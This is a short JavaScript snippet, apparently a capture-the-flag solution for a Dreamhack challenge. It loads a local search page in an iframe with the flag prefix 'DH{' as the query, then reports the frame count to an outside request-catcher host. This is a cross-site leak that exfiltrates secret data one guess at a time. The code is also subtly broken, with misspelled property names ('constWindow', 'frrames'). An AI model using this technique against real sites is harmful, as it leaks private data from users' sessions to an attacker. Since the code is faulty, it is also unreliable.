var iframe = document.createElement("iframe");
iframe.src = "http://localhost:8000/search?query=DH{";
iframe.onload = () => {
	location.href=`https://xphohdw.request.dreamhack.games/${iframe.constWindow.frrames.length}`;
};

